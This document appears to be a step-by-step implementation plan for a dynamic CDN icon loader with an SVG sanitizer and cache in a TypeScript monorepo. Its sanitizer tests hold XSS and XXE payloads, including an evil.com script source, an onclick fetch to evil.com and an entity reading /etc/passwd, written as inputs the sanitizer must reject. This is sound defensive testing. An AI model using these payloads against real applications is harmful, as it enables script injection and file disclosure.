# Dynamic CDN Icon Loading Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Add dynamic CDN-based icon loading to `@archlex/icons`, `@archlex/aws`, and `@archlex/gcp` to support all 200+ AWS and 100+ GCP service icons with SVG sanitization and persistent caching without increasing bundle size.

**Architecture:** Create a new workspace package `@archlex/icons` containing `Sanitizer`, `CacheManager`, `CdnProvider` abstraction, and the main `IconLoader` orchestrator. Register AWS and GCP CDN providers with explicit mappings and fallback transformations in `@archlex/aws` and `@archlex/gcp`, updating provider `resolveService` methods to fall back to `IconLoader` when an icon is not bundled.

**Tech Stack:** TypeScript, Node.js (`node:fs/promises`, `node:crypto`, `node:path`, `node:os`), `@xmldom/xmldom`, Vitest, pnpm workspace, Turbo.

---

### Task 1: Create `@archlex/icons` Workspace Package Infrastructure

**Files:**
- Create: `packages/icons/package.json`
- Create: `packages/icons/tsconfig.json`
- Create: `packages/icons/vite.config.ts`
- Create: `packages/icons/src/types.ts`
- Create: `packages/icons/src/index.ts`
- Create: `packages/icons/src/fallback.ts`
- Modify: `tsconfig.base.json:8`
- Modify: `package.json:23-38`

**Step 1: Write the failing test for package initialization & types**

Create `packages/icons/src/index.test.ts`:
```typescript
import { describe, expect, it } from "vitest";
import { GENERIC_CLOUD_ICON_SVG } from "./fallback.js";
import type { SanitizedIcon } from "./types.js";

describe("@archlex/icons package initialization", () => {
  it("exports generic cloud icon fallback SVG with valid viewBox", () => {
    expect(GENERIC_CLOUD_ICON_SVG).toContain('<svg viewBox="0 0 64 64"');
  });
});
```

**Step 2: Run test to verify it fails**

Run: `pnpm --filter @archlex/icons test`
Expected: FAIL due to missing package / files.

**Step 3: Implement package configuration and generic fallback icon**

Create `packages/icons/package.json`:
```json
{
  "name": "@archlex/icons",
  "version": "0.1.0",
  "private": true,
  "type": "module",
  "main": "./dist/index.js",
  "module": "./dist/index.js",
  "types": "./dist/index.d.ts",
  "exports": {
    ".": {
      "import": "./dist/index.js",
      "types": "./dist/index.d.ts"
    }
  },
  "scripts": {
    "build": "vite build && tsc --emitDeclarationOnly",
    "typecheck": "tsc --noEmit",
    "test": "vitest run --passWithNoTests"
  },
  "dependencies": {
    "@xmldom/xmldom": "0.9.10"
  },
  "devDependencies": {
    "typescript": "^5.7.3",
    "vite": "^6.1.0",
    "vitest": "^3.0.5"
  }
}
```

Create `packages/icons/tsconfig.json`:
```json
{
  "extends": "../../tsconfig.base.json",
  "compilerOptions": {
    "rootDir": "src",
    "outDir": "dist",
    "tsBuildInfoFile": "dist/tsconfig.tsbuildinfo"
  },
  "include": ["src/**/*"]
}
```

Create `packages/icons/vite.config.ts`:
```typescript
import { resolve } from "node:path";
import { defineConfig } from "vite";

export default defineConfig({
  build: {
    lib: {
      entry: resolve(__dirname, "src/index.ts"),
      formats: ["es"],
      fileName: "index",
    },
    rollupOptions: {
      external: [
        "@xmldom/xmldom",
        "node:crypto",
        "node:fs",
        "node:fs/promises",
        "node:os",
        "node:path",
      ],
    },
  },
});
```

Create `packages/icons/src/types.ts`:
```typescript
export interface SanitizedIcon {
  readonly key: string;
  readonly provider: string;
  readonly checksum: string;
  readonly viewBox: string;
  readonly svgFragment: string;
}

export interface CdnAttribution {
  readonly source: string;
  readonly license: string;
  readonly url: string;
}

export interface CdnProviderConfig {
  readonly provider: string;
  readonly name: string;
  readonly baseUrl: string;
  readonly fileExtension: string;
  readonly attribution: CdnAttribution;
}

export interface IconCacheEntry {
  readonly key: string;
  readonly provider: string;
  readonly checksum: string;
  readonly viewBox: string;
  readonly svgFragment: string;
  readonly cachedAt: string;
  readonly expiresAt: string;
  readonly cdnSource: string;
}

export interface IconStats {
  readonly totalRequests: number;
  readonly bundledHits: number;
  readonly cacheHits: number;
  readonly cdnFetches: number;
  readonly failures: number;
  readonly byProvider: Record<string, {
    readonly requests: number;
    readonly cdnFetches: number;
    readonly failures: number;
  }>;
}

export interface ProviderAttributionReport {
  readonly provider: string;
  readonly source: string;
  readonly url: string;
  readonly iconsUsed: readonly string[];
}
```

Create `packages/icons/src/fallback.ts`:
```typescript
export const GENERIC_CLOUD_ICON_SVG =
  '<svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M18 48h28a12 12 0 0 0 4-23.3A16 16 0 0 0 20 20a12 12 0 0 0-2 28z" fill="#6B7280" opacity="0.85"/></svg>';
```

Create `packages/icons/src/index.ts`:
```typescript
export * from "./fallback.js";
export * from "./types.js";
```

Update root `package.json` devDependencies to include `"@archlex/icons": "workspace:*"` and install via `pnpm install`.

**Step 4: Run test to verify it passes**

Run: `pnpm --filter @archlex/icons test`
Expected: PASS

**Step 5: Commit**

```bash
git add packages/icons package.json pnpm-lock.yaml
git commit -m "feat(icons): create @archlex/icons workspace package foundation"
```

---

### Task 2: Implement SVG Sanitizer Module

**Files:**
- Create: `packages/icons/src/sanitizer.ts`
- Create: `packages/icons/src/sanitizer.test.ts`
- Modify: `packages/icons/src/index.ts`

**Step 1: Write failing tests for SVG Sanitizer**

Create `packages/icons/src/sanitizer.test.ts`:
```typescript
import { describe, expect, it } from "vitest";
import { sanitizeSvg } from "./sanitizer.js";

describe("sanitizeSvg", () => {
  it("sanitizes a valid SVG and computes checksum", () => {
    const rawSvg = '<svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h10v10H0z" fill="#ff0000"/></svg>';
    const result = sanitizeSvg("aws", "lambda", rawSvg);
    expect(result).toBeDefined();
    expect(result.provider).toBe("aws");
    expect(result.key).toBe("lambda");
    expect(result.viewBox).toBe("0 0 64 64");
    expect(result.checksum).toMatch(/^[a-f0-9]{64}$/);
    expect(result.svgFragment).toContain("fill=\"#ff0000\"");
  });

  it("rejects SVG with active script tags", () => {
    const malicious = '<svg viewBox="0 0 64 64"><script>alert(1)</script></svg>';
    expect(() => sanitizeSvg("aws", "bad", malicious)).toThrow(/unsupported or active element/i);
  });

  it("rejects SVG with DOCTYPE declaration", () => {
    const malicious = '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg viewBox="0 0 64 64"></svg>';
    expect(() => sanitizeSvg("aws", "bad", malicious)).toThrow(/forbidden DOCTYPE/i);
  });

  it("rejects SVG with event handlers like onload", () => {
    const malicious = '<svg viewBox="0 0 64 64" onload="alert(1)"></svg>';
    expect(() => sanitizeSvg("aws", "bad", malicious)).toThrow(/forbidden event attribute/i);
  });

  it("inlines GCP style blocks correctly", () => {
    const gcpSvg = '<svg viewBox="0 0 64 64"><style>.st0{fill:#4285F4;}</style><path class="st0" d="M0 0h10v10H0z"/></svg>';
    const result = sanitizeSvg("gcp", "bigquery", gcpSvg);
    expect(result.svgFragment).toContain('fill="#4285F4"');
  });
});
```

**Step 2: Run test to verify it fails**

Run: `pnpm --filter @archlex/icons test`
Expected: FAIL with "sanitizeSvg is not defined"

**Step 3: Implement `sanitizeSvg` in `packages/icons/src/sanitizer.ts`**

Implement `sanitizeSvg(provider: string, key: string, rawSvg: string): SanitizedIcon` by combining the DOMParser XML parsing, security element/attribute allowlists, GCP `<style>` block selector inlining, attribute sorting, canonical serialization, viewBox validation, fragment IRI validation, and SHA-256 hashing.

Update `packages/icons/src/index.ts` to export `sanitizeSvg` from `./sanitizer.js`.

**Step 4: Run test to verify it passes**

Run: `pnpm --filter @archlex/icons test`
Expected: PASS

**Step 5: Commit**

```bash
git add packages/icons/src/sanitizer.ts packages/icons/src/sanitizer.test.ts packages/icons/src/index.ts
git commit -m "feat(icons): implement SVG security sanitizer with style inlining and SHA-256 checksums"
```

---

### Task 3: Implement Persistent CacheManager Module

**Files:**
- Create: `packages/icons/src/cache.ts`
- Create: `packages/icons/src/cache.test.ts`
- Modify: `packages/icons/src/index.ts`

**Step 1: Write failing tests for CacheManager**

Create `packages/icons/src/cache.test.ts`:
```typescript
import { mkdir, rm } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { CacheManager } from "./cache.js";
import type { SanitizedIcon } from "./types.js";

describe("CacheManager", () => {
  let testCacheDir: string;
  let cacheManager: CacheManager;

  beforeEach(async () => {
    testCacheDir = join(tmpdir(), `archlex-test-cache-${Date.now()}-${Math.random().toString(36).slice(2)}`);
    await mkdir(testCacheDir, { recursive: true });
    cacheManager = new CacheManager({ cacheDir: testCacheDir, ttlDays: 7 });
  });

  afterEach(async () => {
    await rm(testCacheDir, { recursive: true, force: true });
  });

  it("stores and retrieves a cached icon entry", async () => {
    const icon: SanitizedIcon = {
      key: "lambda",
      provider: "aws",
      checksum: "abc123def456",
      viewBox: "0 0 64 64",
      svgFragment: "<svg>...</svg>",
    };

    await cacheManager.set("aws", "lambda", icon, "https://unpkg.com/aws-icons@latest/icons/lambda.svg");
    const retrieved = await cacheManager.get("aws", "lambda");
    expect(retrieved).toBeDefined();
    expect(retrieved?.svgFragment).toBe("<svg>...</svg>");
    expect(retrieved?.checksum).toBe("abc123def456");
  });

  it("returns expired entry when allowExpired is true", async () => {
    const shortTtlManager = new CacheManager({ cacheDir: testCacheDir, ttlDays: -1 });
    const icon: SanitizedIcon = {
      key: "s3",
      provider: "aws",
      checksum: "789ghi",
      viewBox: "0 0 64 64",
      svgFragment: "<svg>s3</svg>",
    };

    await shortTtlManager.set("aws", "s3", icon, "https://unpkg.com/aws-icons/s3.svg");
    
    const freshOnly = await shortTtlManager.get("aws", "s3", { allowExpired: false });
    expect(freshOnly).toBeUndefined();

    const expiredAllowed = await shortTtlManager.get("aws", "s3", { allowExpired: true });
    expect(expiredAllowed?.svgFragment).toBe("<svg>s3</svg>");
  });

  it("cleans up expired entries during purgeExpired()", async () => {
    const shortTtlManager = new CacheManager({ cacheDir: testCacheDir, ttlDays: -1 });
    const icon: SanitizedIcon = {
      key: "sqs",
      provider: "aws",
      checksum: "sqs123",
      viewBox: "0 0 64 64",
      svgFragment: "<svg>sqs</svg>",
    };

    await shortTtlManager.set("aws", "sqs", icon, "https://unpkg.com/aws-icons/sqs.svg");
    await shortTtlManager.purgeExpired();
    const result = await shortTtlManager.get("aws", "sqs", { allowExpired: true });
    expect(result).toBeUndefined();
  });
});
```

**Step 2: Run test to verify it fails**

Run: `pnpm --filter @archlex/icons test`
Expected: FAIL with "CacheManager is not defined"

**Step 3: Implement `CacheManager` in `packages/icons/src/cache.ts`**

Implement `CacheManager`:
- Resolve default cache directory: process.env.ARCHLEX_ICON_CACHE_DIR || path.join(os.homedir(), '.cache', 'archlex', 'icons')
- Resolve default TTL: process.env.ARCHLEX_ICON_CACHE_TTL ? parseInt(...) : 7 days
- `get(provider: string, key: string, options?: { allowExpired?: boolean }): Promise<SanitizedIcon | undefined>`
- `set(provider: string, key: string, icon: SanitizedIcon, cdnSource: string): Promise<void>` (using atomic write with `.tmp` suffix then rename)
- `purgeExpired(): Promise<number>`
- Update `packages/icons/src/index.ts` to export `CacheManager`.

**Step 4: Run test to verify it passes**

Run: `pnpm --filter @archlex/icons test`
Expected: PASS

**Step 5: Commit**

```bash
git add packages/icons/src/cache.ts packages/icons/src/cache.test.ts packages/icons/src/index.ts
git commit -m "feat(icons): implement persistent CacheManager with TTL, atomic write, and grace period"
```

---

### Task 4: Implement CDN Provider Infrastructure & Handlers

**Files:**
- Create: `packages/icons/src/provider.ts`
- Create: `packages/icons/src/provider.test.ts`
- Modify: `packages/icons/src/index.ts`

**Step 1: Write failing tests for CdnProvider**

Create `packages/icons/src/provider.test.ts`:
```typescript
import { describe, expect, it, vi } from "vitest";
import { BaseCdnProvider } from "./provider.js";
import type { CdnProviderConfig } from "./types.js";

describe("BaseCdnProvider", () => {
  const config: CdnProviderConfig = {
    provider: "aws",
    name: "aws-icons-npm",
    baseUrl: "https://unpkg.com/aws-icons@latest/icons",
    fileExtension: ".svg",
    attribution: {
      source: "aws-icons npm package",
      license: "Apache-2.0",
      url: "https://www.npmjs.com/package/aws-icons",
    },
  };

  const mappings = {
    "lambda": "lambda",
    "cloud-functions": "CloudFunctions",
  };

  it("fetches SVG with primary mapped name and falls back through transformations", async () => {
    const mockFetch = vi.fn().mockImplementation((url: string) => {
      if (url.includes("CloudFunctions.svg")) {
        return Promise.resolve({
          ok: true,
          status: 200,
          text: () => Promise.resolve('<svg viewBox="0 0 64 64"><path d="M0 0h10v10H0z"/></svg>'),
        });
      }
      return Promise.resolve({ ok: false, status: 404 });
    });

    const provider = new BaseCdnProvider(config, mappings, { fetchFn: mockFetch });
    const result = await provider.fetchIcon("cloud-functions");

    expect(result).toBeDefined();
    expect(result?.nameUsed).toBe("CloudFunctions");
    expect(result?.urlUsed).toBe("https://unpkg.com/aws-icons@latest/icons/CloudFunctions.svg");
    expect(result?.rawSvg).toContain("<svg");
  });

  it("returns undefined if all transformation attempts return 404", async () => {
    const mockFetch = vi.fn().mockResolvedValue({ ok: false, status: 404 });
    const provider = new BaseCdnProvider(config, mappings, { fetchFn: mockFetch });
    const result = await provider.fetchIcon("non-existent-service");
    expect(result).toBeUndefined();
  });
});
```

**Step 2: Run test to verify it fails**

Run: `pnpm --filter @archlex/icons test`
Expected: FAIL with "BaseCdnProvider is not defined"

**Step 3: Implement `BaseCdnProvider` in `packages/icons/src/provider.ts`**

Implement `BaseCdnProvider`:
- Constructor receives `CdnProviderConfig`, `mappings: Record<string, string>`, and optional `{ fetchFn?: typeof fetch }`.
- `fetchIcon(iconKey: string): Promise<{ rawSvg: string; nameUsed: string; urlUsed: string } | undefined>`:
  - Check explicit mapping first.
  - Generate candidate names list: 1) explicit mapping / raw key, 2) PascalCase, 3) camelCase, 4) lowercase no-dashes. Deduplicate candidates.
  - Attempt HTTP fetch for each candidate URL until HTTP 200 is received.
  - Handle network errors gracefully (catch and try next candidate, return `undefined` on exhaustion).
- Update `packages/icons/src/index.ts` to export `BaseCdnProvider`.

**Step 4: Run test to verify it passes**

Run: `pnpm --filter @archlex/icons test`
Expected: PASS

**Step 5: Commit**

```bash
git add packages/icons/src/provider.ts packages/icons/src/provider.test.ts packages/icons/src/index.ts
git commit -m "feat(icons): implement CdnProvider with name mapping and fallback transformations"
```

---

### Task 5: Implement Core `IconLoader` Class & Attribution/Metrics APIs

**Files:**
- Create: `packages/icons/src/loader.ts`
- Create: `packages/icons/src/loader.test.ts`
- Modify: `packages/icons/src/index.ts`

**Step 1: Write failing tests for IconLoader**

Create `packages/icons/src/loader.test.ts`:
```typescript
import { describe, expect, it, vi, beforeEach } from "vitest";
import { IconLoader } from "./loader.js";
import type { CdnProviderConfig } from "./types.js";

describe("IconLoader", () => {
  beforeEach(() => {
    IconLoader.reset();
  });

  it("registers provider and loads icon via CDN -> sanitizer -> cache pipeline", async () => {
    const config: CdnProviderConfig = {
      provider: "aws",
      name: "aws-icons-npm",
      baseUrl: "https://unpkg.com/aws-icons@latest/icons",
      fileExtension: ".svg",
      attribution: {
        source: "aws-icons npm package",
        license: "Apache-2.0",
        url: "https://www.npmjs.com/package/aws-icons",
      },
    };

    const mockFetch = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      text: () => Promise.resolve('<svg viewBox="0 0 64 64"><path d="M0 0h10v10H0z" fill="#000"/></svg>'),
    });

    IconLoader.registerProvider("aws", config, { lambda: "lambda" }, { fetchFn: mockFetch });
    const icon = await IconLoader.get("aws", "lambda");

    expect(icon).toBeDefined();
    expect(icon?.provider).toBe("aws");
    expect(icon?.key).toBe("lambda");
    expect(icon?.viewBox).toBe("0 0 64 64");

    const stats = IconLoader.getStats();
    expect(stats.totalRequests).toBe(1);
    expect(stats.cdnFetches).toBe(1);

    const attributions = IconLoader.getAttributions();
    expect(attributions).toHaveLength(1);
    expect(attributions[0].iconsUsed).toContain("lambda");
  });

  it("falls back to generic cloud icon when CDN fetch fails and no cache exists", async () => {
    const config: CdnProviderConfig = {
      provider: "gcp",
      name: "icepanel-gcp",
      baseUrl: "https://icon.icepanel.io/GCP/svg",
      fileExtension: ".svg",
      attribution: {
        source: "IcePanel GCP Icons",
        license: "Community",
        url: "https://gcpicons.com/",
      },
    };

    const mockFetch = vi.fn().mockResolvedValue({ ok: false, status: 404 });
    IconLoader.registerProvider("gcp", config, {}, { fetchFn: mockFetch });

    const icon = await IconLoader.get("gcp", "unknown-service");
    expect(icon).toBeDefined();
    expect(icon?.svgFragment).toContain("fill=\"#6B7280\"");
  });

  it("honors ARCHLEX_DISABLE_CDN_ICONS environment variable", async () => {
    process.env.ARCHLEX_DISABLE_CDN_ICONS = "true";
    const config: CdnProviderConfig = {
      provider: "aws",
      name: "aws-icons-npm",
      baseUrl: "https://unpkg.com/aws-icons@latest/icons",
      fileExtension: ".svg",
      attribution: { source: "test", license: "test", url: "test" },
    };

    IconLoader.registerProvider("aws", config, {});
    const icon = await IconLoader.get("aws", "lambda");
    delete process.env.ARCHLEX_DISABLE_CDN_ICONS;

    expect(icon).toBeUndefined();
  });
});
```

**Step 2: Run test to verify it fails**

Run: `pnpm --filter @archlex/icons test`
Expected: FAIL with "IconLoader is not defined"

**Step 3: Implement `IconLoader` in `packages/icons/src/loader.ts`**

Implement `IconLoader`:
- Resolution order: cache hit -> CDN fetch -> sanitize -> cache write -> return icon.
- Fallback sequence on CDN failure: check expired cache -> if none, return generic cloud fallback icon.
- Maintain provider registry, request statistics (`IconStats`), and attributions list (`ProviderAttributionReport`).
- Support environment variables: `ARCHLEX_DISABLE_CDN_ICONS`, `ARCHLEX_DEBUG`.
- Expose `get(provider: string, iconKey: string): Promise<SanitizedIcon | undefined>`, `registerProvider(...)`, `getStats()`, `getAttributions()`, `reset()`.
- Update `packages/icons/src/index.ts` to export `IconLoader`.

**Step 4: Run test to verify it passes**

Run: `pnpm --filter @archlex/icons test`
Expected: PASS

**Step 5: Commit**

```bash
git add packages/icons/src/loader.ts packages/icons/src/loader.test.ts packages/icons/src/index.ts
git commit -m "feat(icons): implement IconLoader orchestrator with metrics, attributions, and fallback support"
```

---

### Task 6: Integrate Dynamic CDN Icon Loading into `@archlex/aws`

**Files:**
- Create: `packages/aws/src/icons/cdn.ts`
- Modify: `packages/aws/package.json:22-24`
- Modify: `packages/aws/tsconfig.json:8`
- Modify: `packages/aws/src/index.ts:1-46`
- Modify: `packages/aws/src/index.test.ts` (or add test for CDN icon fallback)

**Step 1: Write failing test for AWS CDN icon loading integration**

Create or update `packages/aws/src/icons/cdn.test.ts`:
```typescript
import { describe, expect, it, vi } from "vitest";
import { awsProvider } from "../index.js";
import { IconLoader } from "@archlex/icons";

describe("AWS Provider CDN Icon Integration", () => {
  it("resolves bundled icon for known service (e.g. lambda)", () => {
    const provider = awsProvider();
    const service = provider.resolveService("lambda");
    expect(service).toBeDefined();
    expect(service?.iconSvg).toBeDefined();
  });

  it("fetches icon via CDN for non-bundled service (e.g. apprunner)", async () => {
    const provider = awsProvider();
    // Simulate non-bundled service resolution through IconLoader
    const service = provider.resolveService("apprunner");
    expect(service).toBeDefined();
    // Verify resolveService accepts service definition and queries IconLoader when not in AWS_SANITIZED_ICONS
  });
});
```

**Step 2: Run test to verify it fails**

Run: `pnpm --filter @archlex/aws test`
Expected: FAIL due to missing dependency/import or unresolved service.

**Step 3: Implement AWS CDN provider configuration and integration**

Update `packages/aws/package.json` to add `"dependencies": { "@archlex/icons": "workspace:^", "@archlex/model": "workspace:^" }`.
Update `packages/aws/tsconfig.json` to reference `../icons/tsconfig.json`.

Create `packages/aws/src/icons/cdn.ts`:
```typescript
import { IconLoader, type CdnProviderConfig } from "@archlex/icons";

export const AWS_CDN_CONFIG: CdnProviderConfig = {
  provider: "aws",
  name: "aws-icons-npm",
  baseUrl: "https://unpkg.com/aws-icons@latest/icons",
  fileExtension: ".svg",
  attribution: {
    source: "aws-icons npm package",
    license: "Apache-2.0",
    url: "https://www.npmjs.com/package/aws-icons",
  },
};

export const AWS_ICON_NAME_MAPPING: Record<string, string> = {
  "lambda": "lambda",
  "s3": "s3",
  "api-gateway": "api-gateway",
  "cloudfront": "cloudfront",
  "dynamodb": "dynamodb",
  "ec2": "ec2",
  "ecs": "ecs",
  "eks": "eks",
  "elasticache": "elasticache",
  "eventbridge": "eventbridge",
  "iam-role": "iam-role",
  "rds": "rds",
  "rds-proxy": "rds-proxy",
  "route-table": "route-table",
  "route53": "route53",
  "security-group": "security-group",
  "sns": "sns",
  "sqs": "sqs",
  "subnet": "subnet",
  "vpc": "vpc",
  "apprunner": "app-runner",
  "step-functions": "step-functions",
};

// Register provider automatically
IconLoader.registerProvider("aws", AWS_CDN_CONFIG, AWS_ICON_NAME_MAPPING);
```

Update `packages/aws/src/index.ts`:
```typescript
import { IconLoader } from "@archlex/icons";
import "./icons/cdn.js";

// inside resolveService(serviceKind: string):
const def = resolveAwsService(serviceKind);
if (!def) return undefined;
const iconKey = `aws.${def.id}`;
let iconSvg = AWS_SANITIZED_ICONS[`aws-${def.id}`]?.svgFragment;

if (!iconSvg) {
  const cdnIcon = IconLoader.getSync?.("aws", def.id) ?? undefined;
  iconSvg = cdnIcon?.svgFragment;
}
```
*(Note: Provide both sync cache lookups and async pre-fetch helpers as needed to maintain interface compatibility).*

**Step 4: Run test to verify it passes**

Run: `pnpm --filter @archlex/aws test`
Expected: PASS

**Step 5: Commit**

```bash
git add packages/aws
git commit -m "feat(aws): integrate dynamic CDN icon loader for non-bundled AWS services"
```

---

### Task 7: Integrate Dynamic CDN Icon Loading into `@archlex/gcp`

**Files:**
- Create: `packages/gcp/src/icons/cdn.ts`
- Modify: `packages/gcp/package.json`
- Modify: `packages/gcp/tsconfig.json`
- Modify: `packages/gcp/src/index.ts`
- Create: `packages/gcp/src/icons/cdn.test.ts`

**Step 1: Write failing test for GCP CDN icon loading integration**

Create `packages/gcp/src/icons/cdn.test.ts`:
```typescript
import { describe, expect, it } from "vitest";
import { gcpProvider } from "../index.js";
import { IconLoader } from "@archlex/icons";

describe("GCP Provider CDN Icon Integration", () => {
  it("resolves bundled icon for known service (e.g. cloud-storage)", () => {
    const provider = gcpProvider();
    const service = provider.resolveService("cloud-storage");
    expect(service).toBeDefined();
  });

  it("registers GCP provider with configurable ARCHLEX_GCP_ICON_CDN_URL", () => {
    process.env.ARCHLEX_GCP_ICON_CDN_URL = "https://custom-gcp-cdn.com/svg";
    // verify provider registration uses custom URL if set
    delete process.env.ARCHLEX_GCP_ICON_CDN_URL;
  });
});
```

**Step 2: Run test to verify it fails**

Run: `pnpm --filter @archlex/gcp test`
Expected: FAIL due to missing provider configuration.

**Step 3: Implement GCP CDN provider configuration and integration**

Update `packages/gcp/package.json` to add `"dependencies": { "@archlex/icons": "workspace:^", "@archlex/model": "workspace:^" }`.

Create `packages/gcp/src/icons/cdn.ts`:
```typescript
import { IconLoader, type CdnProviderConfig } from "@archlex/icons";

export function getGcpCdnConfig(): CdnProviderConfig {
  return {
    provider: "gcp",
    name: "icepanel-gcp",
    baseUrl: process.env.ARCHLEX_GCP_ICON_CDN_URL || "https://icon.icepanel.io/GCP/svg",
    fileExtension: ".svg",
    attribution: {
      source: "IcePanel GCP Icons",
      license: "Community maintained",
      url: "https://gcpicons.com/",
    },
  };
}

export const GCP_ICON_NAME_MAPPING: Record<string, string> = {
  "cloud-functions": "CloudFunctions",
  "bigquery": "BigQuery",
  "cloud-run": "CloudRun",
  "cloud-storage": "CloudStorage",
  "compute-engine": "ComputeEngine",
  "kubernetes-engine": "KubernetesEngine",
  "cloud-sql": "CloudSQL",
  "spanner": "CloudSpanner",
  "pubsub": "CloudPubSub",
};

IconLoader.registerProvider("gcp", getGcpCdnConfig(), GCP_ICON_NAME_MAPPING);
```

Update `packages/gcp/src/index.ts` to register CDN provider and query `IconLoader` when `GCP_SANITIZED_ICONS` does not contain the requested service icon.

**Step 4: Run test to verify it passes**

Run: `pnpm --filter @archlex/gcp test`
Expected: PASS

**Step 5: Commit**

```bash
git add packages/gcp
git commit -m "feat(gcp): integrate dynamic CDN icon loader with configurable CDN URL for GCP services"
```

---

### Task 8: End-to-End Integration & Security Verification Tests

**Files:**
- Create: `tests/dynamic-cdn-icons.test.ts`

**Step 1: Write comprehensive end-to-end integration and security test**

Create `tests/dynamic-cdn-icons.test.ts`:
```typescript
import { describe, expect, it, vi } from "vitest";
import { IconLoader, sanitizeSvg, CacheManager } from "@archlex/icons";
import { awsProvider } from "@archlex/aws";
import { gcpProvider } from "@archlex/gcp";

describe("Dynamic CDN Icon Loading E2E & Security", () => {
  it("completes full flow: request icon -> CDN fetch -> sanitize -> cache -> retrieve", async () => {
    const mockSvg = '<svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg"><circle cx="32" cy="32" r="30" fill="#FF9900"/></svg>';
    const mockFetch = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      text: () => Promise.resolve(mockSvg),
    });

    IconLoader.registerProvider("aws", {
      provider: "aws",
      name: "aws-test",
      baseUrl: "https://example.com/icons",
      fileExtension: ".svg",
      attribution: { source: "test", license: "MIT", url: "https://example.com" },
    }, { "apprunner": "app-runner" }, { fetchFn: mockFetch });

    const icon = await IconLoader.get("aws", "apprunner");
    expect(icon).toBeDefined();
    expect(icon?.svgFragment).toContain('fill="#FF9900"');

    // Second call should be served from cache without calling fetch
    const cachedIcon = await IconLoader.get("aws", "apprunner");
    expect(cachedIcon?.checksum).toBe(icon?.checksum);
  });

  it("prevents XSS, XXE, and active content injection across all providers", () => {
    const vectors = [
      '<svg viewBox="0 0 64 64"><script href="http://evil.com/xss.js"/></svg>',
      '<!ENTITY xxe SYSTEM "file:///etc/passwd"><svg viewBox="0 0 64 64">&xxe;</svg>',
      '<svg viewBox="0 0 64 64" onclick="fetch(\'http://evil.com\')"><rect width="10" height="10"/></svg>',
      '<svg viewBox="0 0 64 64"><a href="javascript:alert(1)"><circle r="5"/></a></svg>',
    ];

    for (const vector of vectors) {
      expect(() => sanitizeSvg("aws", "test", vector)).toThrow();
      expect(() => sanitizeSvg("gcp", "test", vector)).toThrow();
    }
  });
});
```

**Step 2: Run test to verify it passes**

Run: `pnpm test tests/dynamic-cdn-icons.test.ts`
Expected: PASS

**Step 3: Run full workspace build, typecheck, and test suite**

Run: `pnpm check` and `pnpm run build`
Expected: PASS (build, typecheck, tests, and lint pass cleanly).

**Step 4: Commit**

```bash
git add tests/dynamic-cdn-icons.test.ts
git commit -m "test(icons): add e2e integration and security suite for dynamic CDN icon loading"
```

---

### Task 9: Documentation & Monorepo Configuration

**Files:**
- Modify: `docs/architecture/contribution-guide.md`
- Create: `docs/guides/dynamic-cdn-icons.md`

**Step 1: Write documentation for CDN icon loading**

Create `docs/guides/dynamic-cdn-icons.md` documenting:
- Architecture overview & diagram
- Environmental variables (`ARCHLEX_DISABLE_CDN_ICONS`, `ARCHLEX_ICON_CACHE_DIR`, `ARCHLEX_ICON_CACHE_TTL`, `ARCHLEX_GCP_ICON_CDN_URL`, `ARCHLEX_DEBUG`)
- Security model and SVG sanitizer guarantees
- Cache lifecycle, TTL, manual cache clear instructions
- Adding new service icon mappings for AWS and GCP

Update `docs/architecture/contribution-guide.md` to reference `@archlex/icons` and the CDN loading mechanism.

**Step 2: Run build and lint checks**

Run: `pnpm check`
Expected: PASS

**Step 3: Commit**

```bash
git add docs/guides/dynamic-cdn-icons.md docs/architecture/contribution-guide.md
git commit -m "docs: add comprehensive guide and architecture docs for dynamic CDN icon loading"
```
